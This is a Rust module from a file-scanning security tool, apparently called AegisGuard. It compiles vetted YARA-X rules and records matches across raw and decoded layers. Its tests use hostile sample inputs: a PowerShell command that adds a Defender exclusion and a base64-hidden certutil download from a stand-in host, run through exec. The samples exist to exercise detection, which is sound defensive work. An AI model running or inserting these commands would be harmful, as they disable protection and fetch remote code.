//! Optional YARA-X scanning (cargo feature `yara`, audit only). Rules are
//! compiled in-process from trusted *text* sources; serialized rule binaries are
//! never loaded. Any compile error, warning, include, import outside the
//! allow-list or missing provenance metadata rejects the whole rule set.
//! Matches are recorded as evidence (rule id, layer, offsets) without the
//! matched bytes and never trigger deletion or blocking.
use crate::budget::Budget;
use crate::model::{Report, YaraMatch, YaraSummary};
use crate::rules;
use sha2::{Digest, Sha256};
use std::fs;
use std::path::Path;
use std::time::Duration;

const MAX_RULE_FILES: usize = 256;
const MAX_RULE_FILE_BYTES: u64 = 1024 * 1024;
const MAX_RULESET_BYTES: u64 = 8 * 1024 * 1024;
/// Offsets kept per pattern; the rest is counted but not listed.
const MAX_OFFSETS: usize = 8;
/// Modules a rule may import. Empty until a module is reviewed for AegisGuard.
const ALLOWED_IMPORTS: &[&str] = &[];
/// Metadata every rule must declare so a match can be traced to its source.
const REQUIRED_META: &[&str] = &["id", "version", "severity", "origin"];

/// Identity of everything that decides a YARA result besides the file and
/// the rule set: the engine version and the built-in deobfuscation that
/// produces the decoded layers.
pub fn engine_identity() -> String {
    format!(
        "yara-x {} / {} / adapter {}",
        YARA_X_VERSION,
        crate::model::BUILTIN_RULESET,
        ADAPTER_VERSION
    )
}

/// Bump when the adapter changes how matches become evidence (2: comment-only
/// matches are flagged).
pub const ADAPTER_VERSION: u32 = 2;

/// Version of the yara-x crate this build links (kept in step with Cargo.toml).
pub const YARA_X_VERSION: &str = "1.22.1";

pub struct RuleSet {
    rules: yara_x::Rules,
    pub sha256: String,
    pub rule_ids: Vec<String>,
}

#[derive(Debug, PartialEq, Eq)]
pub enum ScanFailure {
    Timeout,
    Error,
}

fn meta_string(value: &yara_x::MetaValue) -> String {
    match value {
        yara_x::MetaValue::Integer(i) => i.to_string(),
        yara_x::MetaValue::Float(f) => f.to_string(),
        yara_x::MetaValue::Bool(b) => b.to_string(),
        yara_x::MetaValue::String(s) => s.to_string(),
        yara_x::MetaValue::Bytes(b) => String::from_utf8_lossy(b).into_owned(),
    }
}

fn rule_meta(rule: &yara_x::Rule, key: &str) -> Option<String> {
    rule.metadata()
        .find(|(k, _)| *k == key)
        .map(|(_, v)| meta_string(&v))
}

fn imports(source: &str) -> Vec<String> {
    source
        .lines()
        .filter_map(|line| line.trim().strip_prefix("import "))
        .map(|rest| rest.trim().trim_matches('"').to_owned())
        .collect()
}

/// Compile every `*.yar`/`*.yara` file in `dir` (non-recursive, sorted).
/// Returns the rule set or every problem found.
pub fn compile_dir(dir: &Path) -> Result<RuleSet, Vec<String>> {
    let mut problems = Vec::new();
    let mut files = Vec::new();
    if let Err(e) = rules::read_ledger(dir) {
        problems.push(e.to_string());
    }
    let candidates = rules::rule_files(dir).map_err(|e| vec![format!("{}: {e}", dir.display())])?;
    for path in candidates {
        let meta = fs::symlink_metadata(&path).map_err(|e| vec![e.to_string()])?;
        if !meta.is_file() {
            problems.push(format!("{}: not a regular file", path.display()));
            continue;
        }
        if meta.len() > MAX_RULE_FILE_BYTES {
            problems.push(format!(
                "{}: exceeds the rule file size limit",
                path.display()
            ));
            continue;
        }
        files.push(path);
    }
    if files.is_empty() {
        problems.push(format!("{}: no .yar/.yara files", dir.display()));
    }
    if files.len() > MAX_RULE_FILES {
        problems.push("too many rule files".into());
    }
    let mut sources = Vec::new();
    for path in &files {
        match fs::read_to_string(path) {
            Ok(source) => sources.push((
                path.file_name()
                    .unwrap_or_default()
                    .to_string_lossy()
                    .into_owned(),
                source,
            )),
            Err(e) => problems.push(format!("{}: {e}", path.display())),
        }
    }
    if !problems.is_empty() {
        return Err(problems);
    }
    compile_sources(&sources)
}

/// Compile named in-memory rule sources (e.g. a verified rule pack) with the
/// same gate as [`compile_dir`]. The provenance ledger is checked by the caller.
pub fn compile_sources(sources: &[(String, String)]) -> Result<RuleSet, Vec<String>> {
    let mut problems = Vec::new();
    if sources.is_empty() || sources.len() > MAX_RULE_FILES {
        problems.push("a rule set needs between 1 and 256 files".into());
    }
    let mut compiler = yara_x::Compiler::new();
    compiler
        .enable_includes(false)
        .error_on_slow_pattern(true)
        .error_on_slow_loop(true);
    let mut digest = Sha256::new();
    let mut total = 0u64;
    for (name, source) in sources {
        if source.len() as u64 > MAX_RULE_FILE_BYTES {
            problems.push(format!("{name}: exceeds the rule file size limit"));
            continue;
        }
        total += source.len() as u64;
        for module in imports(source) {
            if !ALLOWED_IMPORTS.contains(&module.as_str()) {
                problems.push(format!("{name}: import \"{module}\" is not allowed"));
            }
        }
        digest.update((name.len() as u64).to_le_bytes());
        digest.update(name.as_bytes());
        digest.update((source.len() as u64).to_le_bytes());
        digest.update(source.as_bytes());
        let namespace = Path::new(name)
            .file_stem()
            .unwrap_or_default()
            .to_string_lossy()
            .into_owned();
        compiler.new_namespace(&namespace);
        let code = yara_x::SourceCode::from(source.as_str()).with_origin(name.as_str());
        if let Err(e) = compiler.add_source(code) {
            problems.push(e.to_string());
        }
    }
    if total > MAX_RULESET_BYTES {
        problems.push("rule set exceeds the total size limit".into());
    }
    let rules = compiler.build();
    for warning in rules.warnings() {
        problems.push(format!("warning treated as error: {warning}"));
    }

    let mut rule_ids = Vec::new();
    for rule in rules.iter() {
        for key in REQUIRED_META {
            if rule_meta(&rule, key).is_none() {
                problems.push(format!(
                    "{}:{} lacks required meta `{key}`",
                    rule.namespace(),
                    rule.identifier()
                ));
            }
        }
        if let Some(id) = rule_meta(&rule, "id") {
            if rule_ids.contains(&id) {
                problems.push(format!("duplicate rule id {id}"));
            }
            rule_ids.push(id);
        }
    }
    if !problems.is_empty() {
        return Err(problems);
    }
    Ok(RuleSet {
        rules,
        sha256: hex::encode(digest.finalize()),
        rule_ids,
    })
}

/// Scan one bounded layer. The caller supplies the remaining time budget.
pub fn scan(
    rules: &RuleSet,
    layer: &str,
    data: &[u8],
    timeout: Duration,
) -> Result<Vec<YaraMatch>, ScanFailure> {
    let mut scanner = yara_x::Scanner::new(&rules.rules);
    // yara-x takes whole seconds; never pass 0, which would disable the limit.
    scanner.set_timeout(timeout.max(Duration::from_secs(1)));
    let results = scanner.scan(data).map_err(|e| match e {
        yara_x::ScanError::Timeout => ScanFailure::Timeout,
        _ => ScanFailure::Error,
    })?;
    let layer_sha256 = hex::encode(Sha256::digest(data));
    let mut out = Vec::new();
    for rule in results.matching_rules() {
        let mut offsets = Vec::new();
        let mut omitted = 0usize;
        for pattern in rule.patterns() {
            for m in pattern.matches() {
                if offsets.len() < MAX_OFFSETS {
                    let range = m.range();
                    offsets.push((range.start, range.len()));
                } else {
                    omitted += 1;
                }
            }
        }
        out.push(YaraMatch {
            rule: rule.identifier().to_owned(),
            namespace: rule.namespace().to_owned(),
            rule_id: rule_meta(&rule, "id").unwrap_or_default(),
            severity: rule_meta(&rule, "severity")
                .and_then(|s| s.parse().ok())
                .unwrap_or(0)
                .min(100),
            layer: layer.to_owned(),
            layer_sha256: layer_sha256.clone(),
            in_comment_only: false,
            offsets,
            omitted_offsets: omitted,
        });
    }
    Ok(out)
}

/// Upper bound for one layer scan, also when the file budget is larger.
const MAX_LAYER_SCAN: Duration = Duration::from_secs(30);

/// YARA evidence collected for one file across its raw and decoded layers.
pub struct Run<'a> {
    rules: &'a RuleSet,
    layers: usize,
    matches: Vec<YaraMatch>,
}

impl<'a> Run<'a> {
    pub fn new(rules: &'a RuleSet) -> Self {
        Self {
            rules,
            layers: 0,
            matches: Vec::new(),
        }
    }

    /// Scan one layer. A spent budget, timeout or engine error marks the report
    /// incomplete; matches become `yara_rule_match` signals plus evidence entries.
    pub fn scan(&mut self, report: &mut Report, layer: &str, data: &[u8], budget: &Budget) {
        self.scan_with_comments(report, layer, data, budget, None);
    }

    /// Like [`Run::scan`]; `comments` are byte ranges of comments in `data`.
    /// A match whose recorded offsets all fall inside comments is kept as
    /// evidence but flagged `in_comment_only` and scored as weak.
    pub fn scan_with_comments(
        &mut self,
        report: &mut Report,
        layer: &str,
        data: &[u8],
        budget: &Budget,
        comments: Option<&[(usize, usize)]>,
    ) {
        if let Some(reason) = budget.exceeded() {
            report.mark_incomplete(reason);
            return;
        }
        let timeout = budget
            .remaining()
            .unwrap_or(MAX_LAYER_SCAN)
            .min(MAX_LAYER_SCAN);
        match scan(self.rules, layer, data, timeout) {
            Ok(found) => {
                self.layers += 1;
                for mut m in found {
                    let id = if m.rule_id.is_empty() {
                        m.rule.clone()
                    } else {
                        m.rule_id.clone()
                    };
                    m.in_comment_only = comments.is_some_and(|spans| {
                        m.omitted_offsets == 0
                            && !m.offsets.is_empty()
                            && m.offsets
                                .iter()
                                .all(|&(o, l)| spans.iter().any(|&(s, e)| o >= s && o + l <= e))
                    });
                    if m.in_comment_only {
                        report.add(
                            "yara_rule_match_in_comment",
                            5,
                            format!("yara:{id}@{layer}"),
                            "A YARA rule matched only text inside comments, which is not executed",
                        );
                    } else {
                        report.add(
                            "yara_rule_match",
                            m.severity,
                            format!("yara:{id}@{layer}"),
                            "A YARA rule matched; see yara.matches for evidence",
                        );
                    }
                    self.matches.push(m);
                }
            }
            Err(ScanFailure::Timeout) => report.mark_incomplete("yara_timeout"),
            Err(ScanFailure::Error) => report.mark_incomplete("yara_scan_error"),
        }
    }

    pub fn finish(self) -> YaraSummary {
        YaraSummary {
            ruleset_sha256: self.rules.sha256.clone(),
            layers_scanned: self.layers,
            matches: self.matches,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::model::{Assessment, Report};
    use base64::Engine as _;
    use std::path::PathBuf;

    fn repo_rules() -> RuleSet {
        compile_dir(&Path::new(env!("CARGO_MANIFEST_DIR")).join("rules/aegisguard")).unwrap()
    }

    fn temp_rules(name: &str, source: &str, ledgered: bool) -> PathBuf {
        let dir =
            std::env::temp_dir().join(format!("aegisguard-yara-{}-{name}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join("t.yar"), source).unwrap();
        if ledgered {
            fs::write(
                dir.join(rules::LEDGER_FILE),
                r#"[{"file":"t.yar","origin":"self-authored","license":"test"}]"#,
            )
            .unwrap();
        }
        dir
    }

    const META: &str = r#"meta: id = "T-1" version = 1 severity = 10 origin = "self-authored""#;

    #[test]
    fn repository_rules_pass_the_gate() {
        let set = repo_rules();
        let mut ids = set.rule_ids.clone();
        ids.sort();
        assert_eq!(ids, vec!["AG-0001", "AG-0002", "AG-0003", "AG-0101"]);
        assert_eq!(set.sha256.len(), 64);
    }

    #[test]
    fn gate_rejects_unsafe_or_untraceable_rule_sets() {
        let cases = [
            ("warning", format!("rule a {{ {META} condition: true }}"), true),
            ("syntax", format!("rule a {{ {META} condition: }}"), true),
            (
                "include",
                format!("include \"other.yar\"\nrule a {{ {META} condition: filesize < 10 }}"),
                true,
            ),
            (
                "import",
                format!("import \"pe\"\nrule a {{ {META} condition: filesize < 10 }}"),
                true,
            ),
            ("nometa", "rule a { condition: filesize < 10 }".to_owned(), true),
            (
                "dupid",
                format!(
                    "rule a {{ {META} condition: filesize < 10 }}\nrule b {{ {META} condition: filesize < 10 }}"
                ),
                true,
            ),
            (
                "noledger",
                format!("rule a {{ {META} condition: filesize < 10 }}"),
                false,
            ),
        ];
        for (name, source, ledgered) in cases {
            let dir = temp_rules(name, &source, ledgered);
            assert!(compile_dir(&dir).is_err(), "{name} must be rejected");
            fs::remove_dir_all(dir).unwrap();
        }
        let ok = temp_rules(
            "ok",
            &format!("rule a {{ {META} condition: filesize < 10 }}"),
            true,
        );
        assert!(compile_dir(&ok).is_ok());
        fs::remove_dir_all(ok).unwrap();
    }

    #[test]
    fn matches_carry_rule_layer_and_offsets_but_not_bytes() {
        let set = repo_rules();
        let data = b"echo 1\nAdd-MpPreference -ExclusionPath C:\\Temp\n";
        let found = scan(&set, "raw", data, Duration::from_secs(5)).unwrap();
        assert_eq!(found.len(), 1);
        let m = &found[0];
        assert_eq!(m.rule_id, "AG-0001");
        assert_eq!(m.layer, "raw");
        assert_eq!(m.severity, 60);
        assert!(!m.offsets.is_empty());
        let json = serde_json::to_string(m).unwrap();
        assert!(!json.contains("Add-MpPreference") && !json.contains("Temp"));
        assert!(scan(&set, "raw", b"print('hello')", Duration::from_secs(5))
            .unwrap()
            .is_empty());
    }

    #[test]
    fn decoded_layers_are_scanned_and_attributed() {
        let set = repo_rules();
        let hidden = base64::engine::general_purpose::STANDARD
            .encode("certutil -urlcache -f https://example.invalid/x x.bin");
        let code = format!("exec(base64.b64decode('{hidden}'))");
        let budget = Budget::new(Duration::from_secs(30));
        let mut report = Report::new("x.py".into(), "script");
        let mut run = Run::new(&set);
        run.scan(&mut report, "raw", code.as_bytes(), &budget);
        crate::script::inspect_layers(
            code.as_bytes(),
            &mut report,
            &budget,
            &mut |r, layer, text| run.scan(r, layer, text.as_bytes(), &budget),
        );
        let summary = run.finish();
        report.finish();
        assert!(summary.layers_scanned >= 2);
        let m = summary
            .matches
            .iter()
            .find(|m| m.rule_id == "AG-0003")
            .unwrap();
        assert!(m.layer.starts_with("decoded/"), "{}", m.layer);
        assert!(report.signals.iter().any(|s| s.code == "yara_rule_match"));
    }

    #[test]
    fn exhausted_budget_never_reports_a_clean_yara_result() {
        let set = repo_rules();
        let mut report = Report::new("x.ps1".into(), "script");
        let mut run = Run::new(&set);
        run.scan(
            &mut report,
            "raw",
            b"Write-Output 1",
            &Budget::new(Duration::ZERO),
        );
        report.finish();
        assert_eq!(run.finish().layers_scanned, 0);
        assert_eq!(report.assessment, Assessment::Incomplete);
        assert_ne!(report.risk, "low_signal");
    }
}
